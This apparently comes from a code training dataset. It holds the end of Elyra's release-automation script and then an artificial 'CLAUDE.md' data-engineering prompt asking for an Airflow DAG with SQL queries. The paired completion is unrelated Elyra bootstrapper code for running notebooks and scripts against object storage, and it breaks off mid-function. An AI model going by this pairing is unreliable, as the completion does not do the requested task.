f\"'elyra-server=={config.new_version}',\")\n        sed(setup_file, \"{{description}}\", f\"'{extensions[extension].description}'\")\n\n        for dependency in extensions[extension].packages:\n            copy_extension_dir(dependency, extension_source_dir)\n\n        # build extension\n        check_run([\"python\", \"setup.py\", \"bdist_wheel\", \"sdist\"], cwd=extension_source_dir)\n        print(\"\")\n\n\ndef prepare_runtime_extensions_package_release() -> None:\n    global config\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"---------------- Preparing Individual Packages ------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    packages = {\"kfp-notebook\": [\"kfp>=1.6.3\"], \"airflow-notebook\": [\"pygithub\", \"black\"]}\n\n    packages_source = {\"kfp-notebook\": \"kfp\", \"airflow-notebook\": \"airflow\"}\n\n    for package in packages:\n        package_source_dir = os.path.join(config.work_dir, package)\n        print(f\"Preparing package : {package} at {package_source_dir}\")\n        # copy extension package template to working directory\n        if os.path.exists(package_source_dir):\n            print(f\"Removing working directory: {config.source_dir}\")\n            shutil.rmtree(package_source_dir)\n        check_run([\"mkdir\", \"-p\", package_source_dir], cwd=config.work_dir)\n        print(f'Copying : {_source(\"etc/templates/setup.py\")} to {package_source_dir}')\n        check_run([\"cp\", _source(\"etc/templates/setup.py\"), package_source_dir], cwd=config.work_dir)\n        # update template\n        setup_file = os.path.join(package_source_dir, \"setup.py\")\n        sed(setup_file, \"{{package-name}}\", package)\n        sed(setup_file, \"{{version}}\", config.new_version)\n        # no data files\n        sed(setup_file, \"{{data - files}}\", \"\")\n        # prepare package specific dependencies\n        requires = \"\"\n        for dependency in packages[package]:\n            requires += f\"'{dependency}',\"\n        sed(setup_file, \"{{install - requires}}\", requires)\n        # copy source files\n        source_dir = os.path.join(config.source_dir, \"elyra\", packages_source[package])\n        dest_dir = os.path.join(package_source_dir, \"elyra\", packages_source[package])\n        print(f\"Copying package source from {source_dir} to {dest_dir}\")\n        Path(os.path.join(package_source_dir, \"elyra\")).mkdir(parents=True, exist_ok=True)\n        shutil.copytree(source_dir, dest_dir)\n\n        # build extension\n        check_run([\"python\", \"setup.py\", \"bdist_wheel\", \"sdist\"], cwd=package_source_dir)\n        print(\"\")\n\n\ndef prepare_changelog() -> None:\n    \"\"\"\n    Prepare a release changelog\n    \"\"\"\n    global config\n    print(f\"Generating changelog for release {config.new_version}\")\n    print(\"\")\n\n    # clone repository\n    checkout_code()\n    # generate changelog with new release list of commits\n    generate_changelog()\n    # commit\n    check_run(\n        [\"git\", \"commit\", \"-a\", \"-m\", f\"Update changelog for release {config.new_version}\"], cwd=config.source_dir\n    )\n\n\ndef prepare_release() -> None:\n    \"\"\"\n    Prepare a release\n    \"\"\"\n    global config\n    print(f\"Processing release from {config.old_version} to {config.new_version} \")\n    print(\"\")\n\n    # clone repository\n    checkout_code()\n    # generate changelog with new release list of commits\n    prepare_changelog()\n    # Update to new release version\n    update_version_to_release()\n    # commit and tag\n    check_run([\"git\", \"commit\", \"-a\", \"-m\", f\"Release v{config.new_version}\"], cwd=config.source_dir)\n    check_run([\"git\", \"tag\", config.tag], cwd=config.source_dir)\n    # server-only wheel\n    build_server()\n    # build release wheel and npm artifacts\n    build_release()\n    # show built release artifacts\n    show_release_artifacts()\n    # back to development\n    update_version_to_dev()\n    # commit\n    check_run([\"git\", \"commit\", \"-a\", \"-m\", f\"Prepare for next development iteration\"], cwd=config.source_dir)\n    # prepare extensions\n    prepare_extensions_release()\n    # prepare runtime extsnsions\n    prepare_runtime_extensions_package_release()\n\n\ndef publish_release(working_dir) -> None:\n    global config\n\n    files_to_publish = [\n        f\"{config.source_dir}/dist/elyra-{config.new_version}-py3-none-any.whl\",\n        f\"{config.source_dir}/dist/elyra-{config.new_version}.tar.gz\",\n        f\"{config.source_dir}/dist/elyra_server-{config.new_version}-py3-none-any.whl\",\n        f\"{config.source_dir}/dist/elyra_server-{config.new_version}.tar.gz\",\n        f\"{config.work_dir}/airflow-notebook/dist/airflow_notebook-{config.new_version}-py3-none-any.whl\",\n        f\"{config.work_dir}/airflow-notebook/dist/airflow-notebook-{config.new_version}.tar.gz\",\n        f\"{config.work_dir}/kfp-notebook/dist/kfp_notebook-{config.new_version}-py3-none-any.whl\",\n        f\"{config.work_dir}/kfp-notebook/dist/kfp-notebook-{config.new_version}.tar.gz\",\n        f\"{config.work_dir}/elyra-code-snippet-extension/dist/elyra_code_snippet_extension-{config.new_version}-py3-none-any.whl\",\n        f\"{config.work_dir}/elyra-code-snippet-extension/dist/elyra-code-snippet-extension-{config.new_version}.tar.gz\",\n        f\"{config.work_dir}/elyra-pipeline-editor-extension/dist/elyra_pipeline_editor_extension-{config.new_version}-py3-none-any.whl\",\n        f\"{config.work_dir}/elyra-pipeline-editor-extension/dist/elyra-pipeline-editor-extension-{config.new_version}.tar.gz\",\n        f\"{config.work_dir}/elyra-python-editor-extension/dist/elyra_python_editor_extension-{config.new_version}-py3-none-any.whl\",\n        f\"{config.work_dir}/elyra-python-editor-extension/dist/elyra-python-editor-extension-{config.new_version}.tar.gz\",\n        f\"{config.work_dir}/elyra-r-editor-extension/dist/elyra_r_editor_extension-{config.new_version}-py3-none-any.whl\",\n        f\"{config.work_dir}/elyra-r-editor-extension/dist/elyra-r-editor-extension-{config.new_version}.tar.gz\",\n        f\"{config.work_dir}/elyra-scala-editor-extension/dist/elyra_scala_editor_extension-{config.new_version}-py3-none-any.whl\",\n        f\"{config.work_dir}/elyra-scala-editor-extension/dist/elyra-scala-editor-extension-{config.new_version}.tar.gz\",\n    ]\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"---------------------- Publishing to PyPI -----------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    # Validate all artifacts to be published are available\n    for file in files_to_publish:\n        if not os.path.exists(file):\n            raise MissingReleaseArtifactException(f\"Missing release file: {file}\")\n\n    # push files to PyPI\n    for file in files_to_publish:\n        print(f\"Publishing: {file}\")\n        check_run([\"twine\", \"upload\", \"--sign\", file], cwd=working_dir)\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"--------------- Pushing Release and Tag to git ------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    # push release and tags to git\n    print()\n    print(\"Pushing release to git\")\n    check_run([\"git\", \"push\"], cwd=config.source_dir)\n    print(\"Pushing release tag to git\")\n    check_run([\"git\", \"push\", \"--tags\"], cwd=config.source_dir)\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"--------------- Preparing to push npm packages ------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    # checkout the tag\n    print()\n    print(f\"Checking out release tag {config.tag}\")\n    check_run([\"git\", \"checkout\", config.tag], cwd=config.source_dir)\n    check_run([\"git\", \"status\"], cwd=config.source_dir)\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"-------------------- Pushing npm packages -----------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    # publish npm packages\n    print()\n    print(f\"publishing npm packages\")\n    check_run(\n        [\"lerna\", \"publish\", \"--yes\", \"from-package\", \"--no-git-tag-version\", \"--no-verify-access\", \"--no-push\"],\n        cwd=config.source_dir,\n    )\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"-------------------- Pushing container images -------------------\")\n    print(\"-----------------------------------------------------------------\")\n    # push container images\n    print()\n    if not config.pre_release:\n        print(f\"Pushing container images\")\n        is_latest = config.git_branch == \"main\"\n        check_run([\"git\", \"checkout\", f\"tags/v{config.new_version}\"], cwd=config.source_dir, capture_output=False)\n        check_run([\"make\", \"publish-container-images\", f\"IMAGE_IS_LATEST={is_latest}\"], cwd=config.source_dir)\n        check_run([\"git\", \"checkout\", \"main\"], cwd=config.source_dir, capture_output=False)\n\n\ndef initialize_config(args=None) -> SimpleNamespace:\n    if not args:\n        raise ValueError(\"Invalid command line arguments\")\n\n    v = re.search(VERSION_REG_EX, elyra._version.__version__)\n\n    configuration = {\n        \"goal\": args.goal,\n        \"git_url\": f\"git@github.com:{args.org or DEFAULT_GIT_ORG}/elyra.git\",\n        \"git_branch\": args.branch or DEFAULT_GIT_BRANCH,\n        \"git_hash\": \"HEAD\",\n        \"git_user_name\": check_output([\"git\", \"config\", \"user.name\"]),\n        \"git_user_email\": check_output([\"git\", \"config\", \"user.email\"]),\n        \"base_dir\": os.getcwd(),\n        \"work_dir\": os.path.join(os.getcwd(), DEFAULT_BUILD_DIR),\n        \"source_dir\": os.path.join(os.getcwd(), DEFAULT_BUILD_DIR, \"elyra\"),\n        \"old_version\": elyra._version.__version__,\n        \"old_npm_version\": f\"{v['major']}.{v['minor']}.{v['patch']}-dev\",\n        \"new_version\": (\n            args.version\n            if (not args.rc or not str.isdigit(args.rc)) and (not args.beta or not str.isdigit(args.beta))\n            else f\"{args.version}rc{args.rc}\" if args.rc else f\"{args.version}b{args.beta}\"\n        ),\n        \"new_npm_version\": (\n            args.version\n            if (not args.rc or not str.isdigit(args.rc)) and (not args.beta or not str.isdigit(args.beta))\n            else f\"{args.version}-rc.{args.rc}\" if args.rc else f\"{args.version}-beta.{args.beta}\"\n        ),\n        \"rc\": args.rc,\n        \"beta\": args.beta,\n        \"dev_version\": f\"{args.dev_version}.dev0\",\n        \"dev_npm_version\": f\"{args.dev_version}-dev\",\n        \"tag\": (\n            f\"v{args.version}\"\n            if (not args.rc or not str.isdigit(args.rc)) and (not args.beta or not str.isdigit(args.beta))\n            else f\"v{args.version}rc{args.rc}\" if args.rc else f\"v{args.version}b{args.beta}\"\n        ),\n        \"pre_release\": True if (args.rc or args.beta) else False,\n    }\n\n    global config\n    config = SimpleNamespace(**configuration)\n\n\ndef print_config() -> None:\n    global config\n    print(\"\")\n    print(\"-----------------------------------------------------------------\")\n    print(\"--------------------- Release configuration ---------------------\")\n    print(\"-----------------------------------------------------------------\")\n    print(f\"Goal \\t\\t\\t -> {config.goal}\")\n    print(f\"Git URL \\t\\t -> {config.git_url}\")\n    print(f\"Git Branch \\t\\t -> {config.git_branch}\")\n    print(f\"Git reference \\t\\t -> {config.git_hash}\")\n    print(f\"Git user \\t\\t -> {config.git_user_name}\")\n    print(f\"Git user email \\t\\t -> {config.git_user_email}\")\n    print(f\"Work dir \\t\\t -> {config.work_dir}\")\n    print(f\"Source dir \\t\\t -> {config.source_dir}\")\n    print(f\"Old Version \\t\\t -> {config.old_version}\")\n    print(f\"Old NPM Version \\t -> {config.old_npm_version}\")\n    print(f\"New Version \\t\\t -> {config.new_version}\")\n    print(f\"New NPN Version \\t -> {config.new_npm_version}\")\n    if config.rc is not None:\n        print(f\"RC number \\t\\t -> {config.rc}\")\n    if config.beta is not None:\n        print(f\"Beta number \\t\\t -> {config.beta}\")\n    print(f\"Dev Version \\t\\t -> {config.dev_version}\")\n    print(f\"Dev NPM Version \\t -> {config.dev_npm_version}\")\n    print(f\"Release Tag \\t\\t -> {config.tag}\")\n    print(\"-----------------------------------------------------------------\")\n    print(\"\")\n\n\ndef print_help() -> str:\n    return \"\"\"create-release.py [ prepare | publish ] --version VERSION\n    \n    DESCRIPTION\n    Creates Elyra release based on git commit hash or from HEAD.\n    \n    create release prepare-changelog --version 1.3.0 [--beta 0] [--rc 0]\n    This will prepare the release changelog and make it ready for review on the release workdir.\n\n    create-release.py prepare --version 1.3.0 --dev-version 1.4.0 [--beta 0] [--rc 0]\n    This will prepare a release candidate, build it locally and make it ready for review on the release workdir.\n    \n    Note: that one can either use a beta or rc modifier for the release, but not both.\n\n    create-release.py publish --version 1.3.0 [--beta 0] [--rc 0]\n    This will build a previously prepared release, and publish the artifacts to public repositories.\n    \n    Required software dependencies for building and publishing a release:\n     - Git\n     - Node\n     - Twine\n     - Yarn\n     \n     Required configurations for publishing a release:\n     - GPG with signing key configured\n     \n     \n    \"\"\"\n\n\ndef main(args=None):\n    \"\"\"Perform necessary tasks to create and/or publish a new release\"\"\"\n    parser = argparse.ArgumentParser(usage=print_help())\n    parser.add_argument(\n        \"goal\",\n        help=\"Supported goals: {prepare-changelog | prepare | publish}\",\n        type=str,\n        choices={\"prepare-changelog\", \"prepare\", \"publish\"},\n    )\n    parser.add_argument(\"--version\", help=\"the new release version\", type=str, required=True)\n    parser.add_argument(\"--dev-version\", help=\"the new development version\", type=str, required=False)\n    parser.add_argument(\"--beta\", help=\"the release beta number\", type=str, required=False)\n    parser.add_argument(\"--rc\", help=\"the release candidate number\", type=str, required=False)\n    parser.add_argument(\"--org\", help=\"the github org or username to use\", type=str, required=False)\n    parser.add_argument(\"--branch\", help=\"the branch name to use\", type=str, required=False)\n    args = parser.parse_args()\n\n    # can't use both rc and beta parameters\n    if args.beta and args.rc:\n        print_help()\n        sys.exit(1)\n\n    global config\n    try:\n        # Validate all pre-requisites are available\n        validate_dependencies()\n        validate_environment()\n\n        # Generate release config based on the provided arguments\n        initialize_config(args)\n        print_config()\n\n        if config.goal == \"prepare-changelog\":\n            prepare_changelog()\n\n            print(\"\")\n            print(\"\")\n            print(f\"Changelog for release version: {config.new_version} is ready for review at {config.source_dir}\")\n            print(\"After you are done, push the reviewed changelog to github.\")\n            print(\"\")\n            print(\"\")\n        elif config.goal == \"prepare\":\n            if not args.dev_version:\n                print_help()\n                sys.exit()\n\n            prepare_release()\n\n            print(\"\")\n            print(\"\")\n            print(f\"Release version: {config.new_version} is ready for review\")\n            print(\"After you are done, run the script again to [publish] the release.\")\n            print(\"\")\n            print(\"\")\n\n        elif args.goal == \"publish\":\n            publish_release(working_dir=os.getcwd())\n        else:\n            print_help()\n            sys.exit()\n\n    except Exception as ex:\n        raise RuntimeError(f\"Error performing release {args.version}\") from ex\n\n\nif __name__ == \"__main__\":\n    main()\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "create-release.py", "language": "python", "complexity": "complex", "star_count": 1942, "quality_score": 0.71, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nfrom abc import ABC\nfrom abc import abstractmethod\nimport glob\nimport json\nimport logging\nimport os\nimport subprocess\nimport sys\nimport time\nfrom typing import Any\nfrom typing import Optional\nfrom typing import Type\nfrom typing import TypeVar\nfrom urllib.parse import urlparse\n\nfrom packaging import version\n\n# Inputs and Outputs separator character.  If updated,\n# same-named variable in _notebook_op.py must be updated!\nINOUT_SEPARATOR = \";\"\n\n# Setup forward reference for type hint on return from class factory method.  See\n# https://stackoverflow.com/questions/39205527/can-you-annotate-return-type-when-value-is-instance-of-cls/39205612#39205612\nF = TypeVar(\"F\", bound=\"FileOpBase\")\n\nlogger = logging.getLogger(\"elyra\")\nenable_pipeline_info = os.getenv(\"ELYRA_ENABLE_PIPELINE_INFO\", \"true\").lower() == \"true\"\n# not only log File Operations output of NotebookFileOp, RFileOp, PythonFileOp to stdout so it appears\n# in runtime / container logs and also Airflow and KFP GUI logs, but also put output to S3 storage\nenable_generic_node_script_output_to_s3 = (\n    os.getenv(\"ELYRA_GENERIC_NODES_ENABLE_SCRIPT_OUTPUT_TO_S3\", \"true\").lower() == \"true\"\n)\npipeline_name = None  # global used in formatted logging\noperation_name = None  # global used in formatted logging\n\n\nclass FileOpBase(ABC):\n    \"\"\"Abstract base class for file-based operations\"\"\"\n\n    filepath = None\n    cos_client = None\n    cos_bucket = None\n\n    @classmethod\n    def get_instance(cls: Type[F], **kwargs: Any) -> F:\n        \"\"\"Creates an appropriate subclass instance based on the extension of the filepath (-f) argument\"\"\"\n        filepath = kwargs[\"filepath\"]\n        if \".ipynb\" in filepath:\n            return NotebookFileOp(**kwargs)\n        elif \".py\" in filepath:\n            return PythonFileOp(**kwargs)\n        elif \".r\" in filepath:\n            return RFileOp(**kwargs)\n        else:\n            raise ValueError(f\"Unsupported file type: {filepath}\")\n\n    def __init__(self, **kwargs: Any) -> None:\n        \"\"\"Initializes the FileOpBase instance\"\"\"\n        import minio\n        from minio.credentials import providers\n\n        self.filepath = kwargs[\"filepath\"]\n        self.input_params = kwargs or []\n        self.cos_endpoint = urlparse(self.input_params.get(\"cos-endpoint\"))\n        self.cos_bucket = self.input_params.get(\"cos-bucket\")\n\n        # Infer secure from the endpoint's scheme.\n        self.secure = self.cos_endpoint.scheme == \"https\"\n\n        # get minio credentials provider\n        if \"cos-user\" in self.input_params and \"cos-password\" in self.input_params:\n            cred_provider = providers.StaticProvider(\n                access_key=self.input_params.get(\"cos-user\"),\n                secret_key=self.input_params.get(\"cos-password\"),\n            )\n        elif \"AWS_ACCESS_KEY_ID\" in os.environ and \"AWS_SECRET_ACCESS_KEY\" in os.environ:\n            cred_provider = providers.EnvAWSProvider()\n        elif \"AWS_ROLE_ARN\" in os.environ and \"AWS_WEB_IDENTITY_TOKEN_FILE\" in os.environ:\n            cred_provider = providers.IamAwsProvider()\n        else:\n            raise RuntimeError(\n                \"No minio credentials provider can be initialised for current configs. \"\n                \"Please validate your runtime configuration details and retry.\"\n            )\n\n        # get minio client\n        self.cos_client = minio.Minio(self.cos_endpoint.netloc, secure=self.secure, credentials=cred_provider)\n\n    @abstractmethod\n    def execute(self) -> None:\n        \"\"\"Execute the operation relative to derived class\"\"\"\n        raise NotImplementedError(\"Method 'execute()' must be implemented by subclasses!\")\n\n    def process_dependencies(self) -> None:\n        \"\"\"Process dependencies\n\n        If a dependency archive is present, it will be downloaded from object storage\n        and expanded into the local directory.\n\n        This method can be overridden by subclasses, although overrides should first\n        call the superclass method.\n        \"\"\"\n        OpUtil.log_operation_info(\"processing dependencies\")\n        t0 = time.time()\n        archive_file = self.input_params.get(\"cos-dependencies-archive\")\n\n        self.get_file_from_object_storage(archive_file)\n\n        inputs = self.input_params.get(\"inputs\")\n        if inputs:\n            input_list = inputs.split(INOUT_SEPARATOR)\n            for file in input_list:\n                self.get_file_from_object_storage(file.strip())\n\n        subprocess.call([\"tar\", \"-zxvf\", archive_file])\n        duration = time.time() - t0\n        OpUtil.log_operation_info(\"dependencies processed\", duration)\n\n    def process_outputs(self) -> None:\n        \"\"\"Process outputs\n\n        If outputs have been specified, it will upload the appropriate files to object storage\n\n        This method can be overridden by subclasses, although overrides should first\n        call the superclass method.\n        \"\"\"\n        OpUtil.log_operation_info(\"processing outputs\")\n        t0 = time.time()\n        outputs = self.input_params.get(\"outputs\")\n        if outputs:\n            output_list = outputs.split(INOUT_SEPARATOR)\n            for file in output_list:\n                self.process_output_file(file.strip())\n            duration = time.time() - t0\n            OpUtil.log_operation_info(\"outputs processed\", duration)\n        else:\n            OpUtil.log_operation_info(\"No outputs found in this operation\")\n\n    def get_object_storage_filename(self, filename: str) -> str:\n        \"\"\"Function to pre-pend cloud storage working dir to file name\n\n        :param filename: the local file\n        :return: the full path of the object storage file\n        \"\"\"\n        return os.path.join(self.input_params.get(\"cos-directory\", \"\"), filename)\n\n    def get_file_from_object_storage(self, file_to_get: str) -> None:\n        \"\"\"Utility function to get files from an object storage\n\n        :param file_to_get: filename\n        \"\"\"\n\n        object_to_get = self.get_object_storage_filename(file_to_get)\n        t0 = time.time()\n        self.cos_client.fget_object(bucket_name=self.cos_bucket, object_name=object_to_get, file_path=file_to_get)\n        duration = time.time() - t0\n        OpUtil.log_operation_info(\n            f\"downloaded {file_to_get} from bucket: {self.cos_bucket}, object: {object_to_get}\", duration\n        )\n\n    def put_file_to_object_storage(self, file_to_upload: str, object_name: Optional[str] = None) -> None:\n        \"\"\"Utility function to put files into an object storage\n\n        :param file_to_upload: filename\n        :param object_name: remote filename (used to rename)\n        \"\"\"\n\n        object_to_upload = object_name\n        if not object_to_upload:\n            object_to_upload = file_to_upload\n\n        object_to_upload = self.get_object_storage_filename(object_to_upload)\n        t0 = time.time()\n        self.cos_client.fput_object(bucket_name=self.cos_bucket, object_name=object_to_upload, file_path=file_to_upload)\n        duration = time.time() - t0\n        OpUtil.log_operation_info(\n            f\"uploaded {file_to_upload} to bucket: {self.cos_bucket} object: {object_to_upload}\", duration\n        )\n\n    def has_wildcard(self, filename):\n        wildcards = [\"*\", \"?\"]\n        return bool(any(c in filename for c in wildcards))\n\n    def process_output_file(self, output_file):\n        \"\"\"Puts the file to object storage.  Handles wildcards and directories.\"\"\"\n\n        matched_files = [output_file]\n        if self.has_wildcard(output_file):  # explode the wildcarded file\n            matched_files = glob.glob(output_file)\n\n        for matched_file in matched_files:\n            if os.path.isdir(matched_file):\n                for file in os.listdir(matched_file):\n                    self.process_output_file(os.path.join(matched_file, file))\n            else:\n                self.put_file_to_object_storage(matched_file)\n\n\nclass NotebookFileOp(FileOpBase):\n    \"\"\"Perform Notebook File Operation\"\"\"\n\n    def execute(self) -> None:\n        \"\"\"Execute the Notebook and upload results to object storage\"\"\"\n        notebook = os.path.basename(self.filepath)\n        notebook_name = notebook.replace(\".ipynb\", \"\")\n        notebook_output = notebook_name + \"-output.ipynb\"\n        notebook_html = notebook_name + \".html\"\n\n        try:\n            OpUtil.log_operation_info(f\"executing notebook using 'papermill {notebook} {notebook_output}'\")\n            t0 = time.time()\n\n            # Include kernel selection in execution time\n            kernel_name = NotebookFileOp.find_best_kernel(notebook)\n\n            # Really hate to do this but have to invoke Papermill via library as workaround\n            import papermill\n\n            logger.info(\"Processing file: %s\", notebook)\n            papermill.execute_notebook(\n                notebook,\n                notebook_output,\n                kernel_name=kernel_name,\n                log_output=True,\n                stdout_file=sys.stdout,\n                stderr_file=sys.stderr,\n            )\n            duration = time.time() - t0\n            OpUtil.log_operation_info(\"notebook execution completed\", duration)\n\n            NotebookFileOp.convert_notebook_to_html(notebook_output, notebook_html)\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(notebook_output, notebook)\n                self.put_file_to_object_storage(notebook_html)\n            self.process_outputs()\n        except Exception as ex:\n            # log in case of errors\n            logger.error(f\"Unexpected error: {sys.exc_info()[0]}\")\n\n            NotebookFileOp.convert_notebook_to_html(notebook_output, notebook_html)\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(notebook_output, notebook)\n                self.put_file_to_object_storage(notebook_html)\n            raise ex\n\n    @staticmethod\n    def convert_notebook_to_html(notebook_file: str, html_file: str) -> str:\n        \"\"\"Function to convert a Jupyter notebook file (.ipynb) into an html file\n\n        :param notebook_file: object storage client\n        :param html_file: name of what the html output file should be\n        :return: html_file: the converted notebook in html format\n        \"\"\"\n        import nbconvert\n        import nbformat\n\n        OpUtil.log_operation_info(f\"converting from {notebook_file} to {html_file}\")\n        t0 = time.time()\n        nb = nbformat.read(notebook_file, as_version=4)\n        html_exporter = nbconvert.HTMLExporter()\n        data, resources = html_exporter.from_notebook_node(nb)\n        with open(html_file, \"w\") as f:\n            f.write(data)\n            f.close()\n\n        duration = time.time() - t0\n        OpUtil.log_operation_info(f\"{notebook_file} converted to {html_file}\", duration)\n        return html_file\n\n    @staticmethod\n    def find_best_kernel(notebook_file: str) -> str:\n        \"\"\"Determines the best kernel to use via the following algorithm:\n\n        1. Loads notebook and gets kernel_name and kernel_language from NB metadata.\n        2. Gets the list of configured kernels using KernelSpecManager.\n        3. If notebook kernel_name is in list, use that, else\n        4. If not found, load each configured kernel.json file and find a language match.\n        5. On first match, log info message regarding the switch and use that kernel.\n        6. If no language match is found, revert to notebook kernel and log warning message.\n        \"\"\"\n        from jupyter_client.kernelspec import KernelSpecManager\n        import nbformat\n\n        nb = nbformat.read(notebook_file, 4)\n\n        nb_kspec = nb.metadata.kernelspec\n        nb_kernel_name = nb_kspec.get(\"name\")\n        nb_kernel_lang = nb_kspec.get(\"language\")\n\n        kernel_specs = KernelSpecManager().find_kernel_specs()\n\n        # see if we have a direct match...\n        if nb_kernel_name in kernel_specs.keys():\n            return nb_kernel_name\n\n        # no match found for kernel, try matching language...\n        for name, file in kernel_specs.items():\n            # load file (JSON) and pick out language, if match, use first found\n            with open(os.path.join(file, \"kernel.json\")) as f:\n                kspec = json.load(f)\n                if kspec.get(\"language\").lower() == nb_kernel_lang.lower():\n                    matched_kernel = os.path.basename(file)\n                    logger.info(\n                        f\"Matched kernel by language ({nb_kernel_lang}), using kernel \"\n                        f\"'{matched_kernel}' instead of the missing kernel '{nb_kernel_name}'.\"\n                    )\n                    return matched_kernel\n\n        # no match found for language, return notebook kernel and let execution fail\n        logger.warning(\n            f\"Reverting back to missing notebook kernel '{nb_kernel_name}' since no \"\n            f\"language match ({nb_kernel_lang}) was found in current kernel specifications.\"\n        )\n        return nb_kernel_name\n\n\nclass PythonFileOp(FileOpBase):\n    \"\"\"Perform Python File Operation\"\"\"\n\n    def execute(self) -> None:\n        \"\"\"Execute the Python script and upload results to object storage\"\"\"\n        python_script = os.path.basename(self.filepath)\n        python_script_name = python_script.replace(\".py\", \"\")\n        python_script_output = python_script_name + \".log\"\n\n        try:\n            OpUtil.log_operation_info(\n                f\"executing python script using \" f\"'python3 {python_script}' to '{python_script_output}'\"\n            )\n            t0 = time.time()\n\n            run_args = [\"python3\", python_script]\n\n            logger.info(\"Processing file: %s\", python_script)\n            try:\n                result = subprocess.run(run_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True)\n                output = result.stdout.decode(\"utf-8\")\n                if enable_generic_node_script_output_to_s3:\n                    with open(python_script_output, \"w\") as log_file:\n                        log_file.write(output)\n                logger.info(\"Output: %s\", output)\n                logger.info(\"Return code: %s\", result.returncode)\n            except subprocess.CalledProcessError as e:\n                logger.error(\"Output: %s\", e.output.decode(\"utf-8\"))\n                logger.error(\"Return code: %s\", e.returncode)\n                raise subprocess.CalledProcessError(e.returncode, run_args)\n\n            duration = time.time() - t0\n            OpUtil.log_operation_info(\"python script execution completed\", duration)\n\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(python_script_output, python_script_output)\n            self.process_outputs()\n        except Exception as ex:\n            # log in case of errors\n            logger.error(f\"Unexpected error: {sys.exc_info()[0]}\")\n            logger.error(f\"Error details: {ex}\")\n\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(python_script_output, python_script_output)\n            raise ex\n\n\nclass RFileOp(FileOpBase):\n    \"\"\"Perform R File Operation\"\"\"\n\n    def execute(self) -> None:\n        \"\"\"Execute the R script and upload results to object storage\"\"\"\n        r_script = os.path.basename(self.filepath)\n        r_script_name = r_script.replace(\".r\", \"\")\n        r_script_output = r_script_name + \".log\"\n\n        try:\n            OpUtil.log_operation_info(f\"executing R script using \" f\"'Rscript {r_script}' to '{r_script_output}'\")\n            t0 = time.time()\n\n            run_args = [\"Rscript\", r_script]\n\n            logger.info(\"Processing file: %s\", r_script)\n            try:\n                result = subprocess.run(run_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=True)\n                output = result.stdout.decode(\"utf-8\")\n                if enable_generic_node_script_output_to_s3:\n                    with open(r_script_output, \"w\") as log_file:\n                        log_file.write(output)\n                logger.info(\"Output: %s\", output)\n                logger.info(\"Return code: %s\", result.returncode)\n            except subprocess.CalledProcessError as e:\n                logger.error(\"Output: %s\", e.output.decode(\"utf-8\"))\n                logger.error(\"Return code: %s\", e.returncode)\n                raise subprocess.CalledProcessError(e.returncode, run_args)\n\n            duration = time.time() - t0\n            OpUtil.log_operation_info(\"R script execution completed\", duration)\n\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(r_script_output, r_script_output)\n            self.process_outputs()\n        except Exception as ex:\n            # log in case of errors\n            logger.error(f\"Unexpected error: {sys.exc_info()[0]}\")\n            logger.error(f\"Error details: {ex}\")\n\n            if enable_generic_node_script_output_to_s3:\n                self.put_file_to_object_storage(r_script_output, r_script_output)\n            raise ex\n\n\nclass OpUtil(object):\n    \"\"\"Utility functions for preparing file execution.\"\"\"\n\n    @classmethod\n    def package_install(cls) -> None:\n        OpUtil.log_operation_info(\"Installing packages\")\n        t0 = time.time()\n        requirements_file = cls.determine_elyra_requirements()\n        elyra_packages = cls.package_list_to_dict(requirements_file)\n        current_packages = cls.package_list_to_dict(\"requirements-current.txt\")\n        to_install_list = []\n\n        for package, ver in elyra_packages.items():\n            if package in current_packages:\n                if current_packages[package] is None:\n                    logger.warning(\n                        f\"WARNING: Source package '{package}' found already installed as an \"\n                        \"editable package. This may conflict with the required version: \"\n                        f\"{ver} . Skipping...\"\n                    )\n                    continue\n                try:\n                    version.Version(current_packages[package])\n                except version.InvalidVersion:  # current version is not PEP-440 compliant\n                    logger.warning(\n                        f\"WARNING: Source package '{package}' found already installed from \"\n                        f\"{current_packages[package]}. This may conflict with the required \"\n                        f\"version: {ver} . Skipping...\"\n                    )\n                    continue\n                if version.Version(ver) > version.Version(current_packages[package]):\n                    logger.info(f\"Updating {package} package from version {current_packages[package]} to {ver}...\")\n                    to_install_list.append(f\"{package}=={ver}\")\n                elif version.Version(ver) < version.Version(current_packages[package]):\n                    logger.info(\n                        f\"Newer {package} package with version {current_packages[package]} \"\n                        f\"already installed. Skipping...\"\n                    )\n            else:\n                logger.info(f\"Package not found. Installing {package} package with version {ver}...\")\n                to_install_list.append(f\"{package}=={ver}\")\n\n        if to_install_list:\n            subprocess.run([sys.executable, \"-m\", \"pip\", \"install\"] + to_install_list, check=True)\n\n        subprocess.run([sys.executable, \"-m\", \"pip\", \"freeze\"])\n        duration = time.time() - t0\n        